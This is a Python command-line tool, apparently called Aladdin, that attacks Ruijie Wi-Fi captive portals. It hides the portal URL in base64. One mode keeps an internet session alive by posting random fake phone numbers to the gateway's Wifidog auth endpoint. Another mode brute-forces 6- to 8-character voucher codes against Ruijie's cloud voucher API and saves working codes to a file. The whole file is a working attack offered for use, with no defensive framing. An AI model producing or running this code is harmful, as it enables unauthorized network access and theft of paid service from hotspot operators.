import os
import re
import sys
import base64
import random
import string
import time
import asyncio
import aiohttp
import requests

# Colors
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

def Logo():
    os.system("clear")
    print(f"""{b}
    ___    __    ___    ____  ____  _____  _   __
   /   |  / /   /   |  / __ \/ __ \/  _/ |/ / / /
  / /| | / /   / /| | / / / / / / // / |   / / / 
 / ___ |/ /___/ ___ |/ /_/ / /_/ // / /   |/_/  
/_/  |_/_____/_/  |_/_____/_____/___//_/|_/(_)  
{g}           [ Ruijie Automation Tool ]{w}""")
    print(f"{y}" + "-"*45 + f"{w}")

async def get_session_id(session, session_url):
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10)'}
    try:
        async with session.get(session_url, headers=headers, timeout=5) as req:
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return match.group(1) if match else None
    except: return None

class AladdinTool:
    def __init__(self):
        # Base64 URL logic fix
        raw_url = b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ=='
        self.session_url = base64.b64decode(raw_url).decode('utf-8', errors='ignore')
        try: self.ip = open(".ip", "r").read().strip()
        except: self.ip = "192.168.0.1"

    async def keep_alive(self):
        Logo()
        print(f"{g}[+] Internet Keep-Alive Running... (Ctrl+C to stop)")
        async with aiohttp.ClientSession() as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                
                if session_id:
                    params = {'token': session_id, 'phoneNumber': '09'+''.join(random.choice(string.digits) for _ in range(8))}
                    try:
                        async with session.post(f"http://{self.ip}:2060/wifidog/auth?", params=params, timeout=5) as res:
                            print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {res.status} - Online")
                    except: session_id = None # Reset if failed
                await asyncio.sleep(3)

    async def voucher_hack(self, mode, length):
        Logo()
        print(f"{g}[+] Hacking {length}-{mode}... (Ctrl+C to stop)")
        async with aiohttp.ClientSession() as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                
                if session_id:
                    if mode == "digit":
                        code = "".join(random.choice(string.digits) for _ in range(length))
                    elif mode == "lower":
                        code = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
                    elif mode == "upper":
                        code = "".join(random.choice(string.ascii_uppercase) for _ in range(length))

                    data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1}
                    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
                    try:
                        async with session.post(url, json=data, timeout=5) as req:
                            res = await req.json()
                            if 'logonUrl' in str(res):
                                print(f"\n{g}[SUCCESS] Found: {code}{w}")
                                with open("success.txt", "a") as f: f.write(f"{code}\n")
                            else:
                                print(f"{w}[TRYING] {code}", end='\r')
                    except: pass
                await asyncio.sleep(0.1)

def setup_process():
    Logo()
    print(f"{y}[*] Detecting Network...{w}")
    try:
        r = requests.get("http://192.168.0.1", timeout=5)
        ip = re.search('gw_address=(.*?)&', r.url).group(1)
        open(".ip", "w").write(ip)
        print(f"{g}[+] Setup Success! IP: {ip}{w}")
    except:
        print(f"{r}[!] Connect to Ruijie WiFi first!{w}")
    time.sleep(2)

def main():
    tool = AladdinTool()
    while True:
        Logo()
        print(f"{w}[1] Start Setup")
        print(f"{w}[2] Internet Keep-Alive")
        print(f"{w}[3] Voucher Hack (Choice)")
        print(f"{r}[0] Exit")
        choice = input(f"\n{y}Select > {w}")

        if choice == '1':
            setup_process()
        elif choice == '2':
            try: asyncio.run(tool.keep_alive())
            except KeyboardInterrupt: pass
        elif choice == '3':
            Logo()
            print("[1] 6 Digits (0-9)\n[2] 6 Letters (abc)\n[3] 6 Letters (ABC)\n[4] 7 Digits\n[5] 8 Digits")
            v_choice = input(f"\n{y}Choose Mode > {w}")
            config = {
                '1': ('digit', 6), '2': ('lower', 6), '3': ('upper', 6),
                '4': ('digit', 7), '5': ('digit', 8)
            }
            if v_choice in config:
                try: asyncio.run(tool.voucher_hack(*config[v_choice]))
                except KeyboardInterrupt: pass
        elif choice == '0':
            break

if __name__ == "__main__":
    main()
      
